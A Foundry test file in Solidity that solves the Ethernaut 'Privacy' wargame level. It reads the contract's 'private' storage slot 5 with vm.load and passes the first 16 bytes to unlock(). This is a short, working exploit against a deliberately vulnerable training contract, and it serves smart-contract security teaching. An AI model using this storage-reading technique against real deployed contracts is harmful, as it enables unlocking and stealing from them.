pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Privacy } from "src/Privacy/Privacy.sol";
import { PrivacyFactory } from "src/Privacy/PrivacyFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testPrivacyHack() external {
        // level setup
        PrivacyFactory factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Privacy privacy = Privacy(payable(levelAddress));

        // attack
        bytes32 password = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(password));

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
